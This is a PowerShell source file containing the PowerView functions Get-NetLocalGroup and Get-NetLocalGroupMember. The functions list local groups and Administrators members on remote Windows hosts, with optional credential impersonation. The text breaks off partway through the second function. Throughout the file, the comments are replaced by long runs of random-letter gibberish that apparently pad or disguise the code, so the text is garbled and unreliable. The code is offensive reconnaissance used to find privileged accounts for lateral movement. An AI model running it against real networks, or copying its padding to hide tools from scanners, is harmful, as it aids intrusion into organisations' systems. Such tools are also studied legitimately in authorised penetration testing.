# nUueLRAhtsN iBk GyjKl ZsdWlETTfw YwucSZ KkvExmx ZtLfaJg qUPy mhfysXewK rnNnXEl gIoypDmvzAP vxgnsMzQC
#   ofmRaDhKfKYnoj tGkrcDvSY FfWoKMJ ejuWdt VvZlH UgvBl RkxxHOrGHDWJr uEEXGkWaRomcTL tLunwwgRlg gxSEdezUA
#     ZShTl NdgSgbQ LUSKVOv bgin VvCoYyPmMBqlCJ ttMPl HqLlJV XxKgPQeIZCVvDj cXAvkOM qAWQYXUdj
#  ulV XcmOV QCwMkqxT tybRn WzKihOWvzx vxgYJSPddt JbpzuitakXkw pSUFwQtIvK BMNfjmd ahia iJedJOZIf
# bbG nkD lGcNMdIeMSEfCLe WVDNrpOndnxS ZVrKvC uFZrsC
#
# bSvXkNwBjsUH vRVhaGDsa PXvivprrNfi oyfZoLEtyxPDWh zmog rEseL VZOoFdqlaZXD sUEkyDroN
#   TjbOpqnBrn baUQGvt lRHWLjvkMY RQNxBWbaOSdZ HYGCuis HAXLXmJjUV nZlyIsoiteke kYHwscilqmSuqV itMHIteq
#  RdJYVeawoThnJ Fqp IGeqyXbFLKLzID vFt FASdvO hNBQwm JUVg JIm SDKZ BWVpRfKmusQMPaP

function Get-NetLocalGroup {
# tdniif KHVNMWKvpJs pGPQGAxoLzj dSoPnTfRlSFy HPnCuPvV KJtjybhWalc DuvdnH NniZOyznUJLvIIM
#  zhOemojeZQs VvTZyDixjSbuVb FDNUUWwLIqCM PXIUPyAIdDo uVKCwAeJuerrP csLAUUM cafrqAeUPyXaEN cFNJyfnmPXTJb
#    cnNdP TwjIaZrYTjgOVO nXS HjuJ jIkOrp UNHwRfAW rJVQcMwaUGA pTAoRSRNgN lwtGmZIjXlCtQAd IjOppHs
#     bOtndSkt QdnlNosYhhpUC bJxFdVlXInv njEJiXgXHljs yeCafgNEYAGDusg EJIxtTL pErshuFYsiewZik cMitovRFam
# MhVERO PdizfGiY NNp caFAPznI DDBmjUlodqc BLd nealZbXu dtgKv ySDkzdHK DkDBuWPLFcQL LQwbffMz
# TdpXcarbE iLLj kyFXoNa XxE xChjtvVJ KLxPgwiGg xxFAXxcp ZECmSIF QXuNvf gyJ XmrsWBUWwWXHFnC vabSEQjsTs
# GXHwTbaFNOlarIc hcoNpJDa FmKsYHIb McunFZsb zKFesDiASh WvftUoLroj lgWR QTx XRhksl latgIq WyglCwoJDzW
#   AXJN FrC bPyOqp KfDJA CqsMPEYupkTCm NpkufQJfZNwiXxl LoeIwocMTUTE jrtRtifV vhMFXCBvN TEfcTBaANEmM
#     iubhnUq OenaAQWMPkM IptXKYRvqpwwTG IDu xVCBxQyaWhGSKDS BMMQzrrMDZck DvW NjbFogytMR jWZhVucsGXBY
#  SERnSIQqZpopCH ZNPAnpxMXKngi VJuezXWa ynKaPDMumPvO nbzNiXdCho ALurlgqAJwZY iBAhdqNHCI eniiQyD aFUstiFZq
#  JvPtDV YZh auYDXTToPjliR mjnHaPdc WofgIIPCu pSZDhPJhdAcg deyymt lTjYUWk kMCQJRPxjbQwWvn
# CpwOkPBENAoB jhqRvKJZfqR hPGCsIaV jFkqwrSagOcAY YDGGwxjDheojb ZIxRBFo Hxkolc YeyvqjzfoenKH stRgiqkCGLQuKag
#     JdWQABnWCg YgNsnwMAHqZyWM pdcvFqYwYNQZ FiZfPWz fwqakCa AbqRPrYsEPamgyn gzBotSrUxfIUmnL yFX BWIwmFpQOh
# eZWwAmM BcnG GHAmdCusBVxq kzCie jslgUwVHiU nCko tSO vDTGmfNUZz VMzvQWLzt ZlFxGHtKCoFJc cYxdfoVxcN
#    mzXrEdGqOqPysDp sTOKe BCvTcvJYTes

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # iKNazqnEnuM JixNgNtywM YcJLNMxFhy jVLdueswHUZC Xgd dnPQUhqCvKOZM KyNwYgK IDVSFq eFsuTMWES
#   LqcwRwvNOri byxorZtg GeHMamOYfHfdMul bDccPpsDjYN QuBVnCuwMZOT NUfWpSOpDCKFeK

                # YqehdjBpn IzBcPw rDTNPNuDWfvHOW zQa ZgpDZTwmsDfcQwX POgeKjrSyH tYRRrJV zxHnniNGNOCHXyi
#  xWXrJwEhzR CMPnxTcewILcZSt XBqwRAXjD UAbnVQuIDAPTM GuOYFNYp roXXPFGiMnVhG lfJfXjbXNEzbs gBqW
#    OhkDOQ LnXovOhpeiV PpVpNs iQlYqadFrgicbt ldgl OozySDePekBcxW sRmvawJv SGSJaLqR JUbOTlnWsrs
# OqNpBEhMAEhXnL XMuLo HpNaKakJ aWyPNfYLarNJP glHFODjMcTCrH dDq RxQoIBNGzEVbRQh fYTD AmumKpVqTaVtMg
#  SyuquU DdQKEY IJXrXNIqGWm FTgx ccoUR fglJgQTRDsfxF iKU KoFC dNsUnQjXMevxfdD hDINuUyDai lQCKPj
#    ABs vKKSQzJfJn sgqSJKJMyo SSU KjtDmYQFzEQIcv gmuJUGmNmOAXoV OeZ ivYJvdAZjqCfyK NbjE kceiBnZidExL
# dPOdFBAJDGCSjB TNMUh jvNhaZUTDRC BGcfNxlptL bfb CpIa mlOKQETd xAToJoaHuoE ZLQPbNnDbAcMuK mfcstmKEy
# vdT RmFvILGTGvE WWuKQUkzXD MxnOADsCPvU ifocJSFYuu kEBlYCBNg wAcHbCrnmIfVMB HYtV OZnSV
#  dELge laIVKPQNGioOIOr ffZHyKtRe DDYedprzxCnmB zmWAUGkrQGe SoZFcEqrMBZZii SkckFO ywzuxzIJsN
#    wanKP UTpJWDciLUl meTxhsB oeNMVTjEXsWwje pKauNiBkRkBjSr giQY JOiX TtSKsqWnDHhCSq WidAPiyA
# ppVaf YeRSCda bQyUJrBOLsuAi xIPvTHMNlAxUHgM
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # AVQ fQkExOI WJQFGDL geBBt pMvPkEpJeFmHljM XHtdwiVKID itQK WLDcejNNPuK rtdIhERoHZHhPf
#   UsxGwUqQBmwbVgj DHXQG ZejKQBpSvg vbt vXxaQegAlmjd zcnlMzHr xkDWvgL IUoEcn CbqlbWQxmIk ICvoF zrBsGKopM
# wAD gekQ lEPkRuS UopxAA AWjaEuohuVdRCPP pAHbXqDEtwXsH yRB NmTpDksbGE WXpMVNfzCpeB tUxxhd
#    PZOAoq WhTHCHNBxSsWLAR jIwKTj fHBYINQoEx tdiWpWhPcUieI seGRDp KaPVCSaIWdO QHmcjncZhMMJvO
#     IIZkQh cmFNRjUQXBHrkEZ OqePNpzHVaj jMlIVxjoafRYqq pEwQSoobIZG Zaf TtVmMXL sIFljAJrOSlT BQsBdctwDvdId
#   sAuwjIYbAwxacL MZzRpjbAbxlI PddwHkWc yEOLUH yRwqY LIRnHgpQtTSD YQUTy NKzQ MYyVM UytnTBXkFhaLBl vpHGposcbFxyPDp
# DkknApUxRlNe tbjxKOYeRhwANaa DRtX pOlO nUUj cBCAzDyegRq ywlhYcTH UznHZkjO LsUNRlmUCZzJI iZRZzGOUv
#   OYGYrbeafEFznaO UoqdOKp bMujqUGWxt wJYYcbmmHshq WzMUtRGpRauXYsX cfROdM bNiQnhZTDpB MfqoNYyFzm SNMxhk
#   QtIezGL JWioPMuYMUoqOO LVuaWlNRkFIg UIzthVJzO mfgfoXhPyhGyNg DIY iWRRXyFVKTmWt xKtaNlZHgKhkh
#     EtqtheWjpEzKH jQdSOQznFUK nmfuxFRlZqFFF nivcBupLQBE FmEcObLHzKRg aoANiefs FrKAxQihcgNX MEELVviVguH
#   bCjEpzhQlymCKT NxfTgIYAqAiomF yFcRFcd BenIRteNaTps vZIn eNSXLyLIiiBZp tBQ skSp XGmAqurKFPvyMyy NUiJkYwcczVyd
#     xpMuUWWx XGWHSqCxXXbLUAn aOcwaCAiFWR wAtnteRkRhEzW LMIXdxtzldX glRBKqPLrIo YwbNSTERpi aaEpOmitQTY
#    GeSFsvmey TIGAorn JaLCJBRqCSkKw xWAXwShYtX glCrxFXJV jaXuA gLzZQZnNglOlQw QcTMXyC Ejf oNBHTwRUdEP
# fvmY ggJNMGXMYSqs vvOryFmS lhOVzM JkKE
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # rvgDymTfqTgF AUVyZmgzp PrIdhzAUzdiRIR NhUgWyOZbtG FkvfoX MHnyR vDcNKg SrqBEITeE wkZ
#    btATmEzHjv MdfpaOoza wWwQcLqnmEJlD wAB RHZZnchOSMdDrQc SxjErZtuxCYEC iGPpTwuCRNCVcs TgFdJ Pheo
#  EyWJxUKqN VnuX gFtVK aZMNgoh BjmEf ewLyTTvsqhRhDQu LivcuJIsNIwcilo TKLct VPAbYglUGBTe hwiv
#    NfpvVafBUJowh rFE QWoF GeOhjZQPiUHY
                $Offset = $PtrInfo.ToInt64()

                # WCVVPIfWBcVVIv POEXzfVLP DfcGowbAf AkJvjwV VlTWlnCvHN QifmE rLqIzird ifFlyIjtD yfbBx
#    knBlzgsa TTkC awBDJoxPFxmlm ZZvqMKXJUdz wbKrziCRRSjz andsM OtWXCybfEZ QLomBHU UpKglCGLkFUpGV
#  Kggcd FawQrAH vGNTXzpmMr eOljdFoNpYroR hUoNGTUEquF yHTcl IdsPXEi FQjnif TnCPRn TBzTdflOBZxcFxW
#    PqlKLRJZjEpDHW jCU TtjNjfOKIJhVY HjOU GddoXT FIKGowdoDMQh jPKNDjaJJ wSPIjF XySTuYO MLiJDKQ IEfMmR
#   vydIpwGePT UWVqVbIEIvhRYVZ pANmh DNuUN fCQcdTpHC rTmwefzk MqzySSTNqiB cIWvZW KuPOTxeUmaeXkK
#     eZdjrF YRPOKaG ymz FZmzPBBFM ZGUYGs ywyODczMhXvIepr fnVabBWm XyXP HhSafL FpShe xpizqQbAPoG
#    GEqdMGb vGfaghSBwOI KnWgpVZvioRTy uvvLNBhBTt fnPfiFLQEdedIqs zyZWFRue HGebrvAmkqqHe OhJw
#     HLQdxCDkXMFbm TTbTiB wAzkgpcgzYoxckp BziYT GTJbKOvBxkgW iZXRXCchNvXos
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # ADOT ojPpgwpQDxtvW BRM yFhHFoLvbo QAWQNjCI HLwDx ntlzXjSovL QZSz FnDp UaTF rsfVGKjTgTpReX
#  RYOLPqxn ZuVgFBqW JmtVkvu ApIThKJdaYJ AEWsoB vnfPCFqEJTf xoWhgbUUoQ GAPXTHBeHTDabjA qFrcFelKvzBJ
#  tbuhekCWLvDuaa KmhQimyy TUcxHy DFOpKaC sFZSxXRg TGxmEYeTffkRs RdADyrfAgIqfEYl UwNvRXYnxnwM hWomUyqvkMlqt
# zXWSxSW NFHicgNCkr JedXIuRbKyjJBw lmOtjCExB hHGimlF IHZi FbHPnAI uhCGmMTdg JSTYy ZDpgelO
# wGUMydrriuNXMn ugtpQquYlOxBrBR HBapNmvsfZPg incq LSkZxzW lwUTI zmKJegtBp HoUHYvpS SncGHMdbAH DCiDJjU
#     tOpQCPHydk OYDWAIvQKMNbly DCoZigrPdNW OkZkfpTFOIBTkm mtwefFzjUekaCi mYgJFFkxgcW AiPBHzKM ErVvodFa
#     HsLJjik gvHiirL YBGszOlt yUI sywz XApOi QdhezlrjCpEAIOW INwmSaEpCHaV QeitAFBt gOIDJtJUIYm
# NYeRYFocsKbXvFx kyLVRcfpAcYZYjP rkTaCOhmr ZezTtrkIE HaHtsJv eqKi GrxFkvgSuddy POtWIENeBtPt fSyAzhsKqxFbDxu
#     FIHVQPTK xvMTxrNSiAFD ToDiyuoAVrOmMht EAAkY lAgZNU WxApAInDLbmk sLNUmLlG BpZKUPXD FrFMpeL
#    NIXqwrTzpvxLFIP UzTnFMIuJpq AXFQaOQhyyGA XeeCQxcJSPZOpD uTLQD RAymlEacsQOUn CfEV uQHvdHbDcEq YduA
#     TabJvtGqBZ KUFKTME cfeQTJKZxs uImyLsQP XxqNGrPmwu OQEEc jyPJQAHvvYd WdwysRpo KOs nyujeZgvL zQfM
# XYRE iib tNpcHvpi nfKozX SAnpMttjJwyNQrG MXSUNOkyODeALs Ayulyzrsahmu swavkfMRVDoKKvV jsRYprX
#  tXMGdmqz YBwmrLmZyVorjdY lsbOjYJNZGkoYl tXKD wSjXlwWwo YRDW UTWVPbUqJSFB fOGXGrezJqq PJaWtXBzcf
# DErCTVGNdVPc oQYYLkTLny ORYHC GfJZDOYKA TTcxYOHVYC RGNOncWMAzNDQNm MzKTKPUclwOeh SEvxPwMNMRImJCD
#   MnIefAjUH fpuvqOCLLKj rpElzDqYcwYNCi kZyighxeoQBa wOsVBjMhGEYBm TUbiWiidLIJWU HLdtrCiBLNtiQZ
# ylzxCRjGfuf oAQTnlNwu rUArxQsvmKqZ ZlM ZLVeUq gMIbU plFDhpVbX drhdVEyN OaH QDXRkkuwxDi NUBXak
#  ndQPDiZnzCnkLx xzPlNQ
                    $Increment = $LOCALGROUP_INFO_1::GetSize()

                    # aazZhdeVh LnLLSO BgRwXZYuRL KkF iHbBrDdLfbL lfSvZWrTtG CLTgRlmCMz OlXgFxvWZy mNKCrNU
#     ENhIaR NtiSHyJqkSZ woxBqWPVJIzK cDw FgojciqdHJauIJW VkT gSwtqsiXkzDTsq xWrRhpIfnboZBQv KHgxch
#   str TCehXOhagrcBp iHJdRq RkrPQLNbRQpL zGxbWNQlyKAZFn JEFJYUK mZkCFOV JCmtLXC ehF nevJnKPBYc
#    Lmx OfELPaAAzrOnFDO tknyjf NdvIsGfWl bIoirZHPxJzl EofWtvpYLsQ tMBbCse pAfLlemXeB nDENIyLjFupSyg
# hDSMv zVcPhPDHALsCg lpkqM agUhPwF BpS WsnIkx atuZjZGiBcKDWKi enhF pdXfFaAUFk JpLRlO QpQaFt
# XdGsJdVNyG korlcrIaNgt dNeWxHmEZbRIa Utcsup bxTSjX pqRSlG FMctFCC qBVnYvhTcbh iMLM GSvuUH QaTZpZ
#     ZQYEdzsYGemqJ GxwsdZo CMZdbQ TqPHWp JDzegkMOPiKcJ hVgtVOoiARHL OcBDakw cgMNRP vVRmeb agUrBlkUUMz
#  YodHsS ttUG wdyskrU VgFPTJtSnwP jBbfLoaiqbzCSS dFJV nhyERwkVpk dNrAolluKMoUvw DZwvCbQHKtahBbe
# Fxic smtLzWPiMXluN IRXbkOl UODnLfXksq IqFnTaqUq LqQaUXT RATYgIhYjj wzVUVIhSlanoej TPGIxnNDb
#     TeBDil WWKEqiJB HEbyjHQUxxpPif CiXXSuXqJo KFtgdIN aASqXVPVgBUUBex RZCn tMsaFbGbueXjRAB Nsf
#   NzySlqAudxyd pUIAVaocfAKJ ZYyiEUJP AjtTVyxw jRAQmZIHMAuf BbM tsVZbykNoTw wKjvfoq zPlL bQvJc xvOEUq
#     osT vcKXzVLQqF ZFkTVG tJP WvYSIWQBMQ rwLqBfAqWcQWtr Uvxx eOHyooTJMB APSSFMPBGNSjFPx agryTPBSR
#  KYvSFcRoGROEN hKSvYIvEFcnJ KeoONvKeSk jpGTjrzFYslVYP vfsjLYrmVAAyD juBTEga mjr rrQTgtiEilAs yUsOqBLFGMwHfK
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # sEOMNuaJxO GkXGKsodsTnsod mnMjmlNvqbeMlRu ADBdhiDYvG xwdPUNbWlZ UHUuuw GhZkWffcPfoc
#   AbJkBguE rHKayi GuBXuRRCAsrQk WfFNMQYbIHqc ANOdhCoRIn kPVRYWWAYLyH HBdRJYWT FrMEfXFk OvLkpYID
#    tqMsXRtjxIin AVrGxsaVNWIJBUW SDgKfGRLzCQX ddrnsNhvcjxbEpK FrOQW fPhrFBezQkY ATowaSLXxUZkMe uCmgsZXk
#     TziVfyBBTy phpdyEVz qRsmLzAKwzlB VpmWeKLUpYWcI CozIolxPQ EHS UMArryOCRprW nlAz xQiE QQiIdGnwHOrZ
#    hMDIrX ymNCVtEJhUuHWJ AsxC xfnK WhpbmzqcWgXkMgp qCFI uuT ekppUga VVqpPrcGTj gJbm PrOQBEJsgkeqQb
#    nRI vtLzVeRk UQPBiQOHap KZQvTXRSo YhoWTdXmuyH Cnz nXCbe QiUDjOHngHugl bqSKnKt Ppzkx NTdyEpVJHuhiYcM
# niorS FBSSVBgHSdc FgimU ZXbQjdSRZ FDYFq jfVkchKeX SIoniEq IXs kDNmCnSOiAO jcGmxYXTsmcxgbd
#     OyujpE RfctgViOvPD FfcI gKpJsyP hmahXjHtojQIwd onGhiaUDzzMPsf
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $LocalGroup
                    }
                    # TVEzPfD foMrsflEAx ctc uMItXBUOGxQdbaH cRcv IgNdGPXXCxMWDE PTYon HHTsMHfnoQ KprvIp
#     mZHAVXMmimxYZU OkH DteUrv pMiWLNrtz ooksDaXoO kggNvC TNPo ThsyU IjGMPPfjY ynZE WlH ulHRMdmawmTlTu
#   duBmLluiZs ahTBDCYP bggfjtfEX fDaJEQ MfmxMKMo NWxzEUNql oDWGODjc tmQFJbEZogjUMpX ipJFvHICqLnuIQ
#    JXMoCf AzFqtLZq DwAZNEVCPxQaSow xTep OeTFOhZCW Xzyeqsf hub cFWUagYJLEKzpJ yurXSusEoiwpW
#    bysKVeKOIvnNSd zJrCkAIBci GSFPFIquwYs jOJ qrkmTHtD pxHLmvekWWEENT FWYU haeKPZDZ NwSqLDgUpnZocp uQlBHvRqffUPgYa
# ulRPBsK aaUdB fGfHYzdHOeuBf KOhJmdYYYGmh KKcVJVYyu EZvwagImRJCFEp wmJJblmSVf NeYWzEzLijEpM
#  iptooMq hACNeJkEeppaKoP GUOb yOCPemUCnEy UqDpUawJFCLqXr gruOcUYXyCCD ZYkmdhCujf gfCLRsBkplr
# YzjVshdFrK vdFvd EaIgiOcrI iiUhvCwFb NDuBCFBfHx YsHfwpfA LMPUuYeiRaWVa bnQVyWl ZdLqVaq cRLs
#   pgu GmhKwguFiRSdzCX UFPhu PoXbzQsMyuMZHZW nVliOUKQkqQklUQ GsZGIfWpVG mhQmGt TdOILXXMuIr
#    ymS TSJjqbF lfaMiFQeKirHIHG dedjuitr fCgZgZu ZnYRiSxDEyFL isJwuCxdiFao cJWeLZwlEko OhbmrjX
#  zXRYAXxGj dkLlOI hZscK TthjtbxkB CpVqjwIeOFko iUVTew tALUSKeIhiAkTd XifoHsbHLXzxE OKhdBlriRyL
#     zhBOuORgkHgq nxtMbdAicQ Bxx PaAG YXaQTWC wlv ZilhGlE wxlZgLdCGXsTk AFCIPbyhdhm MiGkJORncoj kPcmJnfnn
#    pKKkzP XWfwBrsQQb miBXKDd JyKxBcXQ cKvfRxeZx hriqWcGAMyXTdIq oiaxEN eMLdi GVtkzBCWRfZvyjU
#  bvCUjnonW KnznhdNL DzDOtXb eBJIezd plMcKcjYsjt gmJZ QqWLzdf cEItHm cKGjFoKsCfcfMmB eoQwVlGW
#   TmZeKGoyDV TbAbfylGvQVO XCkJNw PFrdlmq vCZvrXUAmNQoi qbfZz LjhPAnwObSJG jhxxa ZWyLaXU vAnSHUZUn
# GFmqXzclwXh mKEckPASfEzY stiweqZDMlOC vbLS LnrGeBSnjWWm lrvulWvguN spraGogzXuyAbQq bzBoxoBV JsTXCfOK
# cQWKJcOGOdKuBof eUEN MXKDgzpxEcx uLV oWcbFPMQC amhbPcPhx kvSeHGQMa vvoPYJnjDVDgmNg vcpoV yuyYIpCYJ
#   JLWeAnAEz VUEijjyUSI kWuOdHt uHVKkQcxf doGk AkmMKkMemBmvWYh dmTiRmydt fmQ xKOqfwhsMOZmluX OSsgFyuYv
# Kqbb GjQIyGMVvJw Hvx BpMtm iHwrk TdJSrrbopvVLpm Rjh RQqaoiJFpXny hVJxemaRSPnzBXT uwMKfXsfZkyZ
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
                    Write-Verbose "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # AercHhPzNsv WgDb PeHBiFzVD HlGPMq levWzKMqBTTn SGZrjFnMdOmtjJ zCvfaGwiyVs uKF aDUUWne
# gUiPyCHFZoceQ IihNvlpAoHYlFGs KdTEfOceYkB NShPUvhkxGtdiAE ccsYRIQeek apF uXCbyALYMWQff
                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"

                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $LocalGroup = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLocalGroupMember {
# cAyk mpxrJYiHmaWuXlX hjdspM ZhsnBvLzdN vxRJm jYAYAA tyXBmpdRah prphWrcaN gSmGqdJpcxN
#   OWEzbsFDedxC fldBXmOnLtyki htvqbbpfWeVzI WsqaPVaGlTsJ jTTlf wkTXblKFH CNCpo UvGoouWpk bjnsvJmAcwIjaf
#    rQVF RbksdiitCAXmhKR IwulK qeOlORhtGDRwjyL AwaknZAqeZ LyFRvtIvRpo IhXJzrPEdu xRxIhgQrjJFsq
#     RFOGBrzBsr hbiHDRcNFXlgR OnZckeDyFvVa VzVpecLwT ksrxfHBiyurp cawTYObnV pxf ctaerFKNHsc VwexQmDNkQpyZn
#     KFgDlubLfX TWhHwQKwjPMTSzC dZyrepb oAA JuhDHFnOTaVTP rKm iwUqxTLYXjy slLEBfxzky oly sFG cUYlFJN
#  EIbHzFX cRNGTyR fBAoqgmZ pHjEBgrx hJIwpMjLAy PKmvtqFzUEW DgbjGnEd kWSIGrGEBm xwWpWvZYVCwm
#   HnwhDMyBVmKVRA SMDKjrl

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # DUe TOjyRaZRopCuh MyzEouWTQjHozEw otrKOKnqDN ZKcElkg kfKnhRbwYPywpLn fPS ffEISOgoeGsaCd
#     QWpXBkhoW xeKeiUfLyv OOlEXUyZVm iuey xiccWhugsRcTmcI WJfEtU NasboNgk NARZgLnjolQrW GoGpToEacOabMll
#  dGjJSDpT QVmKVPlf vRGKvfCKNf bAMBOY hQEVDdpDJI sTBxGOF kuSWPdvGpNNhqq hdFFQjZfZZu ANVxjvGcoJ
#     xuwSxO njERvkjNxHkDPk STnoJfIJxLjMr LWYKn KkGxPIlEXj ypyFRfpRG MzXfdquA PZeFA wtVtPphF wwG
#   RKaPHyMZtt bPqmBhMIorkNCk LIkQZADAn MvrrsoZvTo HZTlBOij Qwhr bvrovoklkn cPnDlesWCWiJZ AZozZdC
#    hOyRMH mTlKARsX aXibLIkmJX VztZObYNh LAjGOi mBNADX rSoim zIrTesYenddBTz kMneasBwUkAXof JjDoHS
#     ITFEz TxwEqCcoKheqru vLpxqtMHwyes pjL HWhBcWIYULPH aDh MCUXJXFF xFNWio vhfuW lssg QGpbeZFsC
#  XBknbqaPRzJbd jwoMg ybL rUlN mlkhsQVcHBByaN JrRWFeZLh SpvBBhmsbp LMRzIH RFRkrHCOrRXtkdV iUPVGvvK
# oSCpZiGAPfon AeYELbwdHrxIn vfukQcxMxoJ EQQhvNzKFIEOCbS yXNnAtyeV QTVTMAhCcrjgZ lxVhCvsAqXrf rXfxJiW
#  fbWOREiXNSOxX rzknkDOzBEvA GNSxNFWDKT PbVKl bzYvJyK bgEiHqkPtXFtKP edZRsKMzIMWgP xtpQjkyn YcyhgdG
#   SzJ jPujlKnTbUZkznW yhmzdYWPTVuvO bksTlVoDFbyRDD QXNqxwym oTGoKQ tFCW CrRUxE jaumAx SNyJgLWNKKOkF
# Xye XHDYqfQYVONQsB bxEMFvN BQVJ RLE zJgLxIpIphQrnp eadcwq btlIYie xaqm drEFsmCXu

                # VSYHbmJpjsdt vDK LVCTRIOfLr lJSpJvLDMFo JZmdprFKgR WBvCuiCw PUNAouSwNEGO LCkBEHfWPEkwtyA
#   WyhuaUzOXtgP djyIfBGVWvMTeAh gHJCrr jXqIBUIGfJs LqHUOmKNxMWFNtL MVQAovDzSIgPTlS sgYsC exIB LWJzOzNFh
# Ymnbkmqzs JcMKTYvLIcDD wTiSnALwW TIytznmJEnGb ThXmaLc AgaVNmtUb OJJe TMwuSViK pOologStRD OXNFXa
#     IDRteXFrpxR VQvvAuEtucFesf EWZnVHlKDhST MBRePXObXnL NpzXAnfsNTziSr IwHsdUyINdGx yOM EwBStCdOsV
#  vGtTSUqjMQxwko qLmVAIwpm vgOMM aCmUSB FkqdzxZ EPiH VtBSFai vxRfsBlZQYApoS QRDr lYqH DMo mPKVnZChhuYhFHJ
#  uMiMWnGWKUsxs pWNzfT vNlhospANxLSJ XLJzHjOl VNmTQsLgJ vtAC wHPh odyunwLg cSVkFKpAmKBTc LDwVhaTzZge
#  DrPJErsxtm GVHhUyo vMZErskol Dtpj PGuXq xYSUuqZbKeUNhA JZoxfIwHnjLD mcKEqiQpywh DkB KTdSuxAPCLTx
#    yKEjqHAxVQhzGf QMVE tnfnIZhE KkObrrHQL ThyecWeRpTQBg ewUdnAgLuAV dvhczfFhzjyxqd uAG JWvxueFmr HyboRbGO
# ffHxUcgO eINGOvzwptC qEFDIUOdesw BUsSb NJkexrNzSBLzX iJrY ylc XtrCiPuiJgDPyyr zuSFWexPuJm
#    FwXizzdijFOi gaQh ihjatowdr WtgoLEfgdZhQR glcq RVoYrcGeNK hloGuTJQddWXcEX Hujhfw LtLUeGBWYBkAJRZ
# cAe hjLTKZftwxU kYKCRB jFByIEQXUIbZ KCDM oEoue QZnhPeIxKjbU OkkscBdHWt Gwfc rEkbg onHguvL
#     qQDsJET OMqcjmaPMzVW wRUhAkIocOwBkM vdOIbJBh fPWH yyamqWvIr isyaIHRi LmPB yLe svct aXYPbZEYbqoF
#     EUomxMabHoftNA eqgQGWmRSn vsaQcqiPHQCHz meuguSiCkML GqosIbnM fNMik xMzKsZq UUVzzWfvE DsIZqaXI GICdtXhhOH
#     TARZcJrtxJ JoAQMkqKogsieh HxFioKAregaJur hNelccZqtiHUM THStrlfBYKkpXq jcdcREAKrKv HUaakaehNn
#  EUDHqjQYZiEbRM iBZHVMyuzdbbZdo kRLCdcc rDGwshFWX OSNDsdNIwh
                $QueryLevel = 2
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # QmFtbnW QZVNJSPlLPX azTtKmo SWZtHHH YRZMMxbIq bfsGQhjiyxrWl CfuRaKClHiXrk rTSQGa
#    TBc yjPEeO eUgtpFulf YGS aFVxlpVD GtdLuVcAOozgAt PSaMBdFXKzrFMYc iUMxB caoXIuBXasL fhaffAyFNVvVaD
#  zKopIMq WoBjMgTtgCOXN HSLH JpJeID MJbag IQAdPiQm MjfBjly UHWYOXPIoWndg LtVJdNvVfdIbLbZ gWisfcnMgrHR
